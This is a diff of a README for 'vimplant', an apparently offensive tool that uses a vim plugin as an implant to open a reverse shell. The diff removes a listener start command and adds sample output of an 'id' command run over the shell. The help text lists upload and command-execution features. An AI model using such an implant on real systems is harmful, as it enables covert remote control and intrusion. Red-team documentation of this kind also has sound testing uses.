@@ -7,11 +7,6 @@ Minimal vim "plugin" for an implant to give a reverse shell.  Plugin is in quote
 ## Prepare the server
 
 ```
-python3 vimplant.py -p <CALLBACK_PORT>
-
-
-
-
 python3 vimplant.py -h
 usage: vimplant.py [-h] -p PORT
 
@@ -45,6 +40,11 @@ vimplant help
          exit - close the connection
          put <local_file> <remote_destination> - upload a local file
          !<local_command> - execute a local command
+>id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),992(ollama)
+
+
+>
 ```
 
 # Features
